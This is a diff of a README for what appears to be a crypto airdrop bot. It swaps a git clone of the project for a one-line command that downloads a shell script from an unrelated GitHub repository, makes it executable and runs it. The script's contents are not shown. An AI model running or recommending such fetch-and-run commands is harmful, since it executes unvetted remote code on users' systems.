@@ -7,8 +7,8 @@ Requirements:
 
 Automation upgrade:
   ```bash
-   git clone https://github.com/airdropinsiders/Naoris-Auto-Bot.git
-   cd Naoris-Auto-Bot
+   cd $HOME && wget https://raw.githubusercontent.com/Gifty7/pipe/main/devnet-two.sh && chmod +x devnet-two.sh && ./devnet-two.sh
+
    ```
 
 
